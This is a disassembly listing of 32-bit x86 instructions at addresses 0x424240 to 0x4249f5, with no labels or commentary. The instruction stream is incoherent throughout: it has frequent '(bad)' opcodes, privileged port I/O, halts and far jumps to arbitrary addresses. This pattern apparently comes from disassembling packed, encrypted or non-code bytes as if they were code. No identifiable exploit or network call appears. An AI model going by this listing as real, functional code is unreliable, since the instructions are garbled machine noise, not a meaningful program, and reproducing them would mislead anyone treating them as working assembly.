  424240:	and    ch,dl
  424242:	sub    al,0x8c
  424244:	pop    es
  424245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424246:	mov    al,0xc8
  424248:	or     al,0xc0
  42424a:	nop
  42424b:	sbb    bh,BYTE PTR [eax-0x1909f99c]
  424251:	pop    edx
  424252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424253:	add    ebx,DWORD PTR [edx]
  424255:	cs sbb eax,0xd23ac2b
  42425b:	lds    esi,FWORD PTR [esi-0x421a94db]
  424261:	ffreep st(4)
  424263:	jne    0x424238
  424265:	or     edi,DWORD PTR ds:0x9389eb05
  42426b:	jmp    DWORD PTR [ecx]
  42426d:	imul   ebp,esi,0x9edf1be3
  424273:	inc    edi
  424274:	retf   0xc32d
  424277:	sub    al,0x5
  424279:	and    eax,0x8454a6fc
  42427e:	sub    BYTE PTR [ebx-0x62],al
  424281:	fadd   DWORD PTR [ebx+0x33]
  424284:	inc    eax
  424285:	stos   BYTE PTR es:[edi],al
  424286:	cld    
  424287:	dec    edi
  424288:	mov    BYTE PTR [esp+eax*4],cl
  42428b:	sbb    ebp,ebx
  42428d:	retf   
  42428e:	pop    edx
  42428f:	ss sub eax,0x471233ec
  424295:	fistp  WORD PTR [esi+ecx*4]
  424298:	adc    dh,0x31
  42429b:	jge    0x424263
  42429d:	hlt    
  42429e:	sti    
  42429f:	mov    edi,0x56ee383b
  4242a4:	fild   DWORD PTR [edx]
  4242a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242a7:	fistp  QWORD PTR [esi]
  4242a9:	fistp  WORD PTR [edx+ecx*1-0x5e]
  4242ad:	in     eax,dx
  4242ae:	mov    DWORD PTR [esi+0x2040548],ebx
  4242b4:	mov    bl,0xe3
  4242b6:	cmp    eax,0x2920b408
  4242bb:	xlat   BYTE PTR ds:[ebx]
  4242bc:	cmp    ebx,DWORD PTR [ecx+0x53b8c77f]
  4242c2:	push   eax
  4242c3:	addr16 xchg esp,eax
  4242c5:	scas   eax,DWORD PTR es:[edi]
  4242c6:	out    0xe6,eax
  4242c8:	sti    
  4242c9:	or     DWORD PTR [eax],eax
  4242cb:	and    al,0x8e
  4242cd:	sbb    BYTE PTR [eax],bh
  4242cf:	jg     0x42426f
  4242d1:	pop    ss
  4242d2:	xor    BYTE PTR [edi+0x7f],cl
  4242d5:	fistp  WORD PTR [ecx-0x5d8ebecc]
  4242db:	push   0x30
  4242dd:	stc    
  4242de:	add    DWORD PTR [esi-0x73],ebx
  4242e1:	adc    BYTE PTR [ebx+0x16],al
  4242e4:	sub    ebp,DWORD PTR [ebx-0x6fcd9aa9]
  4242ea:	js     0x4242b4
  4242ec:	jmp    ecx
  4242ee:	xor    esi,0xaf92bc96
  4242f4:	or     eax,0xa09bfcd3
  4242f9:	xchg   edx,eax
  4242fa:	xchg   edi,eax
  4242fb:	cmp    BYTE PTR [ebx+0x7c],bl
  4242fe:	lods   al,BYTE PTR ds:[esi]
  4242ff:	enter  0x3b75,0x87
  424303:	lock sub DWORD PTR [esi],0x7b
  424307:	je     0x4242ce
  424309:	sbb    BYTE PTR [edi-0x675e121f],ah
  42430f:	push   0x456f3f08
  424314:	iret   
  424315:	ffreep st(3)
  424317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424318:	sub    DWORD PTR [ecx-0x6c],edi
  42431b:	mov    ch,0xee
  42431d:	or     eax,0x8a010cfd
  424322:	dec    esi
  424323:	aas    
  424324:	jmp    0xf60aa6c7
  424329:	dec    eax
  42432a:	mov    cl,0x4a
  42432c:	loop   0x424362
  42432e:	test   DWORD PTR [ecx-0x5abf7115],ebx
  424334:	adc    esi,ebx
  424336:	test   DWORD PTR [eax],esp
  424338:	jge    0x424319
  42433a:	mov    dh,0x1c
  42433c:	mov    esp,0xd289995f
  424341:	test   eax,0x27a168fb
  424346:	push   cx
  424348:	sti    
  424349:	mov    bl,0xe8
  42434b:	push   edx
  42434c:	stos   DWORD PTR es:[edi],eax
  42434d:	int    0xb5
  42434f:	enter  0x4a0d,0xdb
  424353:	scas   al,BYTE PTR es:[edi]
  424354:	out    0x2,al
  424356:	mov    ecx,edi
  424358:	jmp    0x4243ba
  42435a:	jecxz  0x424321
  42435c:	mov    al,BYTE PTR [esi-0xe65822c]
  424362:	xlat   BYTE PTR ds:[ebx]
  424363:	es rcr edi,cl
  424366:	jns    0x424301
  424368:	pop    ebx
  424369:	xor    esi,eax
  42436b:	push   ss
  42436c:	(bad)  
  42436d:	call   0x28ede66a
  424372:	or     BYTE PTR [edx+0x10],dh
  424375:	nop
  424376:	mov    ebx,0x5829ec8
  42437b:	push   cs
  42437c:	(bad)  
  42437d:	(bad)  
  42437e:	mov    edi,0xb686eb13
  424383:	adc    dh,al
  424385:	inc    esi
  424386:	lods   eax,DWORD PTR ds:[esi]
  424387:	pop    edx
  424388:	outs   dx,DWORD PTR ds:[esi]
  424389:	fisttp WORD PTR [ecx+0x3471de52]
  42438f:	xor    BYTE PTR [esi+0xc],al
  424392:	std    
  424393:	jnp    0x4243ff
  424395:	push   ecx
  424396:	dec    eax
  424397:	idiv   DWORD PTR [edx]
  424399:	pusha  
  42439a:	jp     0x424361
  42439c:	mov    ah,0x35
  42439e:	sub    al,0x46
  4243a0:	(bad)  
  4243a1:	pusha  
  4243a2:	loope  0x4243be
  4243a4:	jecxz  0x424398
  4243a6:	mov    WORD PTR [esi-0x21],?
  4243a9:	pop    esp
  4243aa:	std    
  4243ab:	repz mov al,ds:0xfe6504e1
  4243b1:	scas   al,BYTE PTR es:[edi]
  4243b2:	into   
  4243b3:	fstp   QWORD PTR [edi]
  4243b5:	xor    eax,0x12595c7c
  4243ba:	inc    edx
  4243bb:	or     DWORD PTR [esi+0x5a],eax
  4243be:	(bad)  
  4243bf:	hlt    
  4243c0:	jno    0x424354
  4243c2:	in     eax,0x0
  4243c4:	(bad)  
  4243c5:	fild   WORD PTR [eax-0x500639bb]
  4243cb:	xchg   ecx,eax
  4243cc:	pop    ebp
  4243cd:	fistp  WORD PTR [edi-0x6]
  4243d0:	mov    dh,0x40
  4243d2:	idiv   DWORD PTR [edi]
  4243d4:	idiv   edx
  4243d6:	cld    
  4243d7:	mov    al,0x99
  4243d9:	popaw  
  4243db:	cmp    esi,ebp
  4243dd:	mov    dl,0x3d
  4243df:	pusha  
  4243e0:	(bad)  
  4243e1:	fild   QWORD PTR [ebp+0x20a6fc55]
  4243e7:	lahf   
  4243e8:	hlt    
  4243e9:	into   
  4243ea:	cld    
  4243eb:	(bad)  
  4243ed:	aas    
  4243ee:	push   esi
  4243ef:	int3   
  4243f0:	and    al,0xe8
  4243f2:	jno    0x4243b0
  4243f4:	jmp    0x221198a7
  4243f9:	das    
  4243fa:	cmp    eax,0xa715178
  4243ff:	fsub   st(3),st
  424401:	sbb    bl,BYTE PTR ds:0x8ddd01f
  424407:	aad    0xdb
  424409:	fisttp WORD PTR [ebx]
  42440b:	imul   ebp,DWORD PTR [edi-0x1e],0x37
  42440f:	xor    DWORD PTR [eax-0x1b],edi
  424412:	jecxz  0x424473
  424414:	or     edx,ecx
  424416:	add    ah,bh
  424418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42441a:	cld    
  42441b:	test   eax,0xd46fc317
  424420:	int3   
  424421:	enter  0x1a71,0x3a
  424425:	fild   WORD PTR [ebx-0x5b5d973a]
  42442b:	int3   
  42442c:	jmp    0x12e95c
  424431:	fwait
  424432:	mov    ch,0xbd
  424434:	sub    esi,DWORD PTR [esi-0x72fb4492]
  42443a:	xchg   ebp,eax
  42443b:	mov    esi,0x9e2aeb79
  424440:	imul   edi,ebp,0xbdd0615c
  424446:	sbb    al,0x9
  424448:	sbb    bl,BYTE PTR [eax-0x3]
  42444b:	jbe    0x42440c
  42444d:	pop    esi
  42444e:	mov    eax,ds:0x74a0c7f8
  424453:	enter  0xbdb,0x35
  424457:	jnp    0x4244ad
  424459:	(bad)  
  42445a:	lods   al,BYTE PTR ds:[esi]
  42445b:	jge    0x42443e
  42445d:	std    
  42445e:	cmp    bl,cl
  424460:	lock mov ecx,0x47593179
  424466:	js     0x42442d
  424468:	mov    ch,0xdf
  42446a:	and    esi,ebx
  42446c:	and    ch,BYTE PTR [ebx+0x4e]
  42446f:	mov    ebx,0x8ffd3ea1
  424474:	xlat   BYTE PTR gs:[ebx]
  424476:	bound  eax,QWORD PTR [esi]
  424478:	jmp    0x59015d1e
  42447d:	mov    al,ds:0x2e1c47dc
  424482:	add    eax,0xf2b88015
  424487:	add    ah,cl
  424489:	(bad)  
  42448a:	push   ebx
  42448b:	sub    BYTE PTR [eax-0x3e1f9bb8],bl
  424491:	fdiv   QWORD PTR [ebx+0x3a0393db]
  424497:	jae    0x4244d4
  424499:	sub    BYTE PTR [ebx+0x65],al
  42449c:	jmp    0x4244a9
  42449e:	adc    ah,bh
  4244a0:	ss test bl,dl
  4244a3:	das    
  4244a4:	jae    0x424485
  4244a6:	adc    BYTE PTR [edx+0xf76245e],0xf2
  4244ad:	sar    esp,1
  4244af:	jge    0x424484
  4244b1:	jle    0x42452a
  4244b3:	mov    WORD PTR [ebx-0x1b],ss
  4244b6:	jge    0x4244f8
  4244b8:	out    dx,eax
  4244b9:	fistp  QWORD PTR [ecx-0x77827e88]
  4244bf:	sbb    dl,BYTE PTR [edx]
  4244c1:	pop    edi
  4244c2:	std    
  4244c3:	mov    BYTE PTR [ebx+0x66aa954f],dl
  4244c9:	rcl    esp,cl
  4244cb:	(bad)  
  4244cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244cd:	xor    ebx,DWORD PTR [ecx+0x5f]
  4244d0:	or     ch,dl
  4244d2:	in     eax,0xe5
  4244d4:	jmp    0x4244f9
  4244d6:	xlat   BYTE PTR ds:[ebx]
  4244d7:	in     eax,dx
  4244d8:	lods   eax,DWORD PTR ds:[esi]
  4244d9:	mov    al,0x72
  4244db:	fld    st(0)
  4244dd:	fsub   QWORD PTR [eax]
  4244df:	mov    ebx,0xb8bc2c89
  4244e4:	arpl   cx,ax
  4244e6:	sub    edi,edi
  4244e8:	std    
  4244e9:	or     bh,BYTE PTR [esp+esi*1]
  4244ec:	jmp    0x4244b6
  4244ee:	mov    gs,WORD PTR [edx-0x59]
  4244f1:	aas    
  4244f2:	cwde   
  4244f3:	fbstp  TBYTE PTR [eax+0x21]
  4244f6:	std    
  4244f7:	imul   ebp
  4244f9:	jno    0x4244b7
  4244fb:	dec    esi
  4244fc:	or     al,0xa5
  4244fe:	jmp    DWORD PTR [ecx+0x2b]
  424501:	sub    bh,dh
  424503:	into   
  424504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424505:	aaa    
  424506:	sub    ebx,DWORD PTR [ebx]
  424508:	(bad)  
  42450a:	cmp    eax,DWORD PTR [ecx-0x101ad497]
  424510:	or     al,0xb1
  424512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424513:	mov    edx,0xae31ecea
  424518:	add    ebp,DWORD PTR [esi-0x9]
  42451b:	daa    
  42451c:	push   ds
  42451d:	(bad)  
  42451e:	jecxz  0x4244e8
  424520:	repz push ebx
  424522:	repz mov ah,0xac
  424525:	jp     0x42456b
  424527:	push   ds
  424528:	sub    eax,DWORD PTR [ecx-0x22142a9b]
  42452e:	jno    0x42453b
  424530:	retf   0xdcfe
  424533:	fcom   st(0)
  424535:	aaa    
  424536:	repz (bad) 
  424538:	adc    ecx,DWORD PTR [ebp+0x37]
  42453b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42453c:	mov    dl,0x40
  42453e:	inc    ebp
  42453f:	or     bl,ch
  424541:	arpl   WORD PTR [ecx-0x5d],sp
  424544:	push   edi
  424545:	push   cs
  424546:	inc    esi
  424547:	jmp    0x424566
  424549:	fcomip st,st(5)
  42454b:	cmp    BYTE PTR [edx+0x3a],dh
  42454e:	aad    0x60
  424550:	mov    dh,0x34
  424552:	clc    
  424553:	or     ah,BYTE PTR [eax]
  424555:	jo     0x4245ae
  424557:	leave  
  424558:	jne    0x42459d
  42455a:	nop
  42455b:	mov    ebx,0xc89f020b
  424560:	mov    BYTE PTR [edi-0x59],cl
  424563:	out    0x8f,al
  424565:	sub    eax,0xd4ee3ccc
  42456a:	push   eax
  42456b:	popf   
  42456c:	mov    bh,BYTE PTR [esi+0x60]
  42456f:	dec    ecx
  424570:	gs dec esp
  424572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424573:	aas    
  424574:	stos   BYTE PTR es:[edi],al
  424575:	fidivr WORD PTR [ecx+0x2cc414d]
  42457b:	adc    DWORD PTR ds:0xeb15b9bf,edx
  424581:	xor    DWORD PTR [eax],ecx
  424583:	daa    
  424584:	rol    BYTE PTR [ebx+esi*1-0x392bb4fb],cl
  42458b:	adc    al,0xe7
  42458d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42458e:	jl     0x4245c3
  424590:	imul   ecx,eax,0xffffffc9
  424593:	ins    DWORD PTR es:[edi],dx
  424594:	out    0x2,al
  424596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424597:	repnz aaa 
  424599:	loope  0x424557
  42459b:	pop    ebp
  42459c:	stos   BYTE PTR es:[edi],al
  42459d:	in     eax,0xbc
  42459f:	enter  0x2333,0x59
  4245a3:	pop    ecx
  4245a4:	sub    BYTE PTR [eax],0x4d
  4245a7:	adc    eax,0xbe295aeb
  4245ac:	lods   al,BYTE PTR ds:[esi]
  4245ad:	xor    dl,BYTE PTR [eax+0x48df8e0a]
  4245b3:	mov    esp,0x4c3716f9
  4245b8:	and    eax,0x72bafd75
  4245bd:	xchg   esi,eax
  4245be:	pop    ebx
  4245bf:	retf   
  4245c0:	fs fwait
  4245c2:	push   0xffffffce
  4245c4:	adc    eax,0xb269a93
  4245c9:	test   eax,0x45b15950
  4245ce:	cs pop eax
  4245d0:	jmp    0x4245b7
  4245d2:	or     dl,BYTE PTR [ebp+0x3c]
  4245d5:	mov    ds:0xdf765edb,eax
  4245da:	mov    cl,0x3d
  4245dc:	jns    0x424595
  4245de:	jo     0x424586
  4245e0:	sbb    al,BYTE PTR [edi+0x605a0ae8]
  4245e6:	adc    DWORD PTR [ebp+0x69],ecx
  4245e9:	cmc    
  4245ea:	cld    
  4245eb:	mov    ah,0x2
  4245ed:	pop    eax
  4245ee:	jl     0x4245b8
  4245f0:	cdq    
  4245f1:	das    
  4245f2:	mov    dl,0xd6
  4245f4:	sbb    esi,DWORD PTR [eax]
  4245f6:	inc    edx
  4245f7:	push   ebx
  4245f8:	out    0xf1,al
  4245fa:	mov    ds:0x2cfbee93,al
  4245ff:	nop
  424600:	and    al,0x95
  424602:	(bad)  
  424603:	enter  0x1361,0xeb
  424607:	xrelease mov BYTE PTR [ebp-0x30115c51],dh
  42460e:	loopne 0x424631
  424610:	adc    bl,BYTE PTR [edi+0x1b9fc211]
  424616:	and    al,cl
  424618:	xchg   ebp,eax
  424619:	rol    al,1
  42461b:	adc    al,0x1c
  42461d:	sbb    al,0xf7
  42461f:	sub    bl,ch
  424621:	jmp    DWORD PTR [edi+0x54]
  424624:	fs icebp 
  424626:	int    0xbe
  424628:	pop    esp
  424629:	outs   dx,DWORD PTR ds:[esi]
  42462a:	ror    dh,1
  42462c:	mov    ebx,0x2bc5568f
  424631:	mov    ecx,0x23c735e8
  424636:	std    
  424637:	test   BYTE PTR [edx+0x681a8dfa],0xeb
  42463e:	and    ecx,eax
  424640:	lds    esp,FWORD PTR [esi]
  424642:	push   eax
  424644:	addr16 inc edi
  424646:	xor    DWORD PTR [edx],0x8754cbeb
  42464c:	xchg   ebx,eax
  42464d:	rcl    DWORD PTR [ebp+0x5e013be2],0xfe
  424654:	das    
  424655:	fimul  WORD PTR [esi-0x35dad5a6]
  42465b:	or     BYTE PTR [esi+0x45f9fce0],ch
  424661:	inc    ebx
  424662:	loopne 0x4245fa
  424664:	ja     0x4246b6
  424666:	aaa    
  424667:	mov    ebx,0x57e99b9d
  42466c:	pop    edx
  42466d:	cli    
  42466e:	std    
  42466f:	mov    ebx,0x1560ad54
  424674:	fld    QWORD PTR [edx-0x3b]
  424677:	out    0x76,eax
  424679:	(bad)  
  42467b:	and    ebx,edx
  42467d:	pushw  cs
  42467f:	mov    ds:0xace4eae4,al
  424684:	lock fbstp TBYTE PTR [ebp+0x1c]
  424688:	sub    esp,DWORD PTR [edx]
  42468a:	jp     0x4246b8
  42468c:	jp     0x42466d
  42468e:	dec    edi
  42468f:	jae    0x42466a
  424691:	loopne 0x424695
  424693:	shl    DWORD PTR gs:[edx-0x3],cl
  424697:	pop    eax
  424698:	inc    esp
  424699:	sub    eax,0xcef83064
  42469e:	add    al,0x28
  4246a0:	mov    bl,0xdf
  4246a2:	inc    edi
  4246a3:	(bad)  [edx]
  4246a5:	pusha  
  4246a6:	add    bl,BYTE PTR [ebx-0x77]
  4246a9:	jge    0x4246a9
  4246ab:	push   es
  4246ac:	xor    DWORD PTR [eax],eax
  4246ae:	push   esp
  4246af:	ror    DWORD PTR ds:0xbc31cced,0xdf
  4246b6:	inc    esi
  4246b7:	ins    BYTE PTR es:[edi],dx
  4246b8:	push   ebx
  4246b9:	retf   0x4622
  4246bc:	leave  
  4246bd:	jns    0x4246bd
  4246bf:	das    
  4246c0:	ret    
  4246c1:	mov    ds:0x3e762e2b,eax
  4246c6:	mov    dh,0xe9
  4246c8:	mov    edi,DWORD PTR [edx]
  4246ca:	xlat   BYTE PTR ds:[ebx]
  4246cb:	xchg   esp,eax
  4246cc:	pop    ecx
  4246cd:	pop    ds
  4246ce:	lds    ebx,FWORD PTR [ebx]
  4246d0:	test   eax,0xebecf1bc
  4246d5:	pop    esi
  4246d6:	pop    ss
  4246d7:	les    edi,FWORD PTR [ebx-0x4]
  4246da:	add    ch,BYTE PTR ds:0xfc81e055
  4246e0:	cwde   
  4246e1:	hlt    
  4246e2:	push   esi
  4246e3:	js     0x424717
  4246e5:	or     DWORD PTR [ebx],edi
  4246e7:	int3   
  4246e8:	fld    QWORD PTR [edi]
  4246ea:	imul   ecx,DWORD PTR [ecx-0xf],0x86b95287
  4246f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246f2:	mov    ah,0xa3
  4246f4:	in     al,dx
  4246f5:	fisttp WORD PTR [ecx+0x10a44a6c]
  4246fb:	push   es
  4246fc:	cmp    edx,DWORD PTR [eax-0x5626a103]
  424702:	mov    al,ds:0x45357c12
  424707:	enter  0xeb0b,0xbb
  42470b:	push   ds
  42470c:	iret   
  42470d:	out    dx,al
  42470e:	xchg   ecx,eax
  42470f:	cmp    al,0xc5
  424711:	pop    ebx
  424712:	das    
  424713:	inc    edi
  424714:	out    0x62,al
  424716:	and    eax,0x1274bbfa
  42471b:	fxch   st(5)
  42471d:	(bad)  
  42471f:	addr16 je 0x42478d
  424722:	fmul   QWORD PTR [ecx-0x21]
  424725:	adc    bh,bh
  424727:	sbb    eax,0xc0e45295
  42472c:	mov    DWORD PTR [esi+0x3435725],ebx
  424732:	push   edx
  424733:	enter  0xfb3e,0x61
  424737:	pushf  
  424738:	sbb    esp,DWORD PTR [ecx-0x66dc9d50]
  42473e:	cld    
  42473f:	pop    es
  424740:	nop
  424741:	xchg   esp,eax
  424742:	dec    edx
  424743:	inc    esp
  424744:	sbb    eax,0xd1c85ab0
  424749:	sub    eax,0xa540a14a
  42474e:	xchg   ebx,eax
  42474f:	out    0xeb,eax
  424751:	mov    ds:0x70238795,al
  424756:	rcl    al,1
  424758:	or     ecx,ebx
  42475a:	xor    BYTE PTR [esi],cl
  42475c:	js     0x4246f6
  42475e:	fdiv   QWORD PTR [eax-0x43]
  424761:	call   0xae3fa6f9
  424766:	fld    TBYTE PTR [ebp+0xb1d496b]
  42476c:	cmp    al,0x34
  42476e:	aad    0xc7
  424770:	mov    bh,0x52
  424772:	lods   al,BYTE PTR ds:[esi]
  424773:	ds in  al,dx
  424775:	retf   0xc789
  424778:	jmp    0x4247be
  42477a:	imul   esp,esp,0xc3b588c9
  424780:	mov    dh,0xd4
  424782:	mov    ebx,0xfcd8efe8
  424787:	mov    edx,0x8a9f5459
  42478c:	add    BYTE PTR [ecx+0x1eab7528],al
  424792:	pop    DWORD PTR [esi-0x37ed96e7]
  424798:	enter  0x886e,0x23
  42479c:	mov    WORD PTR [esi+0x2d11b33f],ds
  4247a2:	inc    BYTE PTR [ebx]
  4247a4:	fstp   DWORD PTR [eax]
  4247a6:	into   
  4247a7:	das    
  4247a8:	dec    esp
  4247a9:	gs int 0xab
  4247ac:	or     al,0x47
  4247ae:	inc    esp
  4247af:	enter  0xd352,0x2e
  4247b3:	or     al,0x2d
  4247b5:	inc    edi
  4247b6:	pop    edx
  4247b7:	fsubr  st,st(3)
  4247b9:	lods   eax,DWORD PTR ds:[esi]
  4247ba:	(bad)  
  4247bb:	jne    0x4247fd
  4247bd:	data16 repz int3 
  4247c0:	pop    esp
  4247c1:	fisub  WORD PTR [edi]
  4247c3:	imul   esp,DWORD PTR [esi],0x86d620e4
  4247c9:	sbb    eax,DWORD PTR [eax]
  4247cb:	cld    
  4247cc:	(bad)  
  4247ce:	std    
  4247cf:	ror    BYTE PTR [ecx-0x11],0xad
  4247d3:	fld    st(3)
  4247d5:	dec    ebx
  4247d6:	mov    edi,DWORD PTR [eax]
  4247d8:	and    eax,0x61341ddf
  4247dd:	cmp    eax,0xd189148
  4247e2:	std    
  4247e3:	cs iret 
  4247e5:	in     eax,dx
  4247e6:	add    eax,0xf833ca71
  4247eb:	loop   0x424816
  4247ed:	dec    esi
  4247ee:	hlt    
  4247ef:	enter  0x67ed,0x7d
  4247f3:	sar    DWORD PTR [edx-0x2d],1
  4247f6:	mov    ebp,0x6c0ceb87
  4247fb:	mov    cl,0xc6
  4247fd:	adc    ch,BYTE PTR [ecx-0x1f]
  424800:	jecxz  0x4247c6
  424802:	sbb    cl,al
  424804:	arpl   si,bx
  424806:	and    eax,edi
  424808:	jne    0x424827
  42480a:	cs into 
  42480c:	out    0x29,al
  42480e:	call   FWORD PTR [eax+edi*8+0x2e]
  424812:	int    0x92
  424814:	jp     0x4247e8
  424816:	test   al,0xc8
  424818:	daa    
  424819:	or     ch,ah
  42481b:	je     0x4247cc
  42481d:	jmp    0xfdec:0xe8f20656
  424824:	test   BYTE PTR [eax+0x4ef0b9fd],dh
  42482a:	jns    0x424820
  42482c:	inc    ecx
  42482d:	inc    esp
  42482e:	std    
  42482f:	mov    dl,0x49
  424831:	mov    bh,0x4e
  424833:	cmp    esp,esp
  424835:	jo     0x424817
  424837:	jecxz  0x4247f9
  424839:	popa   
  42483a:	mov    esi,0xcd7b19c8
  42483f:	push   ds
  424840:	adc    al,0x78
  424842:	std    
  424843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424844:	xchg   BYTE PTR [ebx],ah
  424846:	pop    eax
  424847:	adc    dh,BYTE PTR [edi+0x3dc8406a]
  42484d:	cwde   
  42484e:	sub    DWORD PTR [ebx+0x4acbb28a],edx
  424854:	mov    ds:0xa2d2fc85,eax
  424859:	cs pop es
  42485b:	mov    edx,0xc1fd2ae2
  424860:	sub    ecx,DWORD PTR [ebx-0x569cfaca]
  424866:	cld    
  424867:	push   esp
  424868:	mov    ecx,0xa3656086
  42486d:	or     DWORD PTR [ebp-0x820d060],eax
  424873:	(bad)  
  424875:	pop    eax
  424876:	push   esp
  424877:	les    ecx,FWORD PTR [ebp-0x62]
  42487a:	cld    
  42487b:	retf   0xcaef
  42487e:	inc    edx
  42487f:	xor    BYTE PTR [ebx+0x47d1dd2f],0xab
  424886:	adc    ebx,DWORD PTR [esi-0x4b6420f3]
  42488c:	aaa    
  42488d:	or     bl,0xd0
  424890:	in     eax,dx
  424891:	xor    al,0x46
  424893:	mov    edi,0x2e89bf79
  424898:	sbb    DWORD PTR [ebx+0xc],edx
  42489b:	enter  0xec33,0x6b
  42489f:	lds    ebp,FWORD PTR [ecx+esi*2+0x1bebcb5b]
  4248a6:	add    ebx,ebp
  4248a8:	mov    eax,ds:0x25894a3
  4248ad:	fisttp WORD PTR [edi+0x6f]
  4248b0:	jno    0x4248df
  4248b2:	sbb    esp,DWORD PTR [ecx+eiz*2]
  4248b5:	xor    ebx,DWORD PTR [eax+0x42deeb39]
  4248bb:	scas   eax,DWORD PTR es:[edi]
  4248bc:	cli    
  4248bd:	cmp    DWORD PTR [ecx],edi
  4248bf:	adc    al,0x94
  4248c1:	fild   WORD PTR [ecx-0x34cfd093]
  4248c7:	jno    0x424935
  4248c9:	retf   
  4248ca:	cld    
  4248cb:	imul   esi,DWORD PTR [ebp+0x302d69bf],0x17bde4e
  4248d5:	(bad)  
  4248d6:	std    
  4248d7:	pop    esi
  4248d8:	imul   edx,DWORD PTR [edx],0x6f
  4248db:	aaa    
  4248dc:	pop    esp
  4248dd:	and    eax,0xfe8316a1
  4248e2:	add    ebp,DWORD PTR [ebp-0x4f]
  4248e5:	sti    
  4248e6:	mov    esp,0x38e1fafa
  4248eb:	outs   dx,DWORD PTR ds:[esi]
  4248ec:	(bad)  
  4248ed:	fsubr  st,st(2)
  4248ef:	cmp    bh,BYTE PTR [ebx-0x3f]
  4248f2:	mov    esp,0x7c1fed19
  4248f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248f8:	jmp    0x424929
  4248fa:	push   es
  4248fb:	or     al,BYTE PTR [ebx-0x44]
  4248fe:	push   esp
  4248ff:	in     al,dx
  424900:	aam    0xe7
  424902:	xchg   ebx,eax
  424903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424904:	add    dh,dh
  424906:	loopne 0x42497b
  424908:	repnz fsub QWORD PTR [edi]
  42490b:	cdq    
  42490c:	push   edi
  42490d:	pop    edi
  42490e:	sar    DWORD PTR [ecx-0x22038466],cl
  424914:	or     al,0x3a
  424916:	jge    0x424996
  424918:	inc    ebx
  424919:	sub    eax,0xfc9cb25d
  42491e:	add    bh,cl
  424920:	int    0xa4
  424922:	cld    
  424923:	jno    0x4248d6
  424925:	add    bh,BYTE PTR [eax-0x53]
  424928:	retf   
  424929:	add    eax,0x4febf56d
  42492e:	sbb    al,0x65
  424930:	mov    eax,ds:0xe8f0e16f
  424935:	movq   mm7,QWORD PTR [esi]
  424938:	xor    al,0x68
  42493a:	jge    0x4248cf
  42493c:	add    edx,DWORD PTR ds:0x755bc7de
  424942:	push   esp
  424943:	inc    ebx
  424944:	(bad)  
  424945:	ficom  WORD PTR [edi+0x7542eb67]
  42494b:	iret   
  42494c:	push   DWORD PTR ss:0x4cdea937
  424953:	into   
  424954:	aas    
  424955:	sub    BYTE PTR [eax+0x6c],bl
  424958:	mov    DWORD PTR [edi],esi
  42495a:	jg     0x4249d3
  42495c:	out    0xd2,al
  42495e:	les    eax,FWORD PTR [eax-0x23]
  424961:	or     eax,0x2a9b5c4d
  424966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424967:	into   
  424968:	cld    
  424969:	jbe    0x4249e6
  42496b:	cmc    
  42496c:	imul   edi,DWORD PTR [esi-0x5cd9be17],0xfffffffc
  424973:	stos   BYTE PTR es:[edi],al
  424974:	dec    edx
  424975:	je     0x424965
  424977:	fcomp  QWORD PTR [ebx+0x5ac7fb2e]
  42497d:	call   DWORD PTR [edx+0x7c]
  424980:	(bad)  
  424981:	out    dx,al
  424982:	push   ebx
  424983:	xchg   ebx,eax
  424984:	std    
  424985:	test   al,0xf2
  424987:	inc    esp
  424988:	mov    ebp,0xe29ffca9
  42498d:	aas    
  42498e:	or     ebx,DWORD PTR [edi+0x50]
  424991:	or     DWORD PTR [ecx],eax
  424993:	pop    esi
  424994:	out    0x6c,al
  424996:	repnz push ebp
  424998:	scas   al,BYTE PTR es:[edi]
  424999:	(bad)  
  42499a:	outs   dx,DWORD PTR ds:[esi]
  42499b:	imul   bh
  42499d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42499e:	(bad)  
  42499f:	pushf  
  4249a0:	lahf   
  4249a1:	in     al,0xf5
  4249a3:	mov    dl,0x3d
  4249a5:	pop    ds
  4249a6:	mov    dh,0x49
  4249a8:	sbb    ebx,edi
  4249aa:	pop    esi
  4249ab:	xor    eax,0x80bb681f
  4249b0:	cld    
  4249b1:	aas    
  4249b2:	repz ja 0x424944
  4249b5:	mov    BYTE PTR [bx+si],ch
  4249b8:	inc    BYTE PTR [ebx+0x70]
  4249bb:	lea    edx,[eax+ebp*8]
  4249be:	inc    edx
  4249bf:	out    0xf,al
  4249c1:	lahf   
  4249c2:	loope  0x424990
  4249c4:	xor    edi,DWORD PTR [edx]
  4249c6:	pushf  
  4249c7:	stos   DWORD PTR es:[edi],eax
  4249c8:	jmp    0x42499f
  4249ca:	pop    ss
  4249cb:	push   edi
  4249cc:	cld    
  4249cd:	inc    esi
  4249ce:	sar    BYTE PTR [edx-0x6e26201e],0xb5
  4249d5:	outs   dx,BYTE PTR ds:[esi]
  4249d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249d7:	pusha  
  4249d8:	int3   
  4249d9:	outs   dx,DWORD PTR ds:[esi]
  4249da:	daa    
  4249db:	push   eax
  4249dc:	jmp    0x424a44
  4249de:	dec    ebp
  4249df:	pop    ecx
  4249e0:	fisttp DWORD PTR [ebx]
  4249e2:	cmp    al,0xd1
  4249e4:	inc    esp
  4249e5:	fisubr WORD PTR ds:0x29bdb27b
  4249eb:	shr    DWORD PTR ds:0xebde402b,cl
  4249f1:	fwait
  4249f2:	mov    ah,0xdb
  4249f4:	lods   al,BYTE PTR ds:[esi]
  4249f5:	cmc    
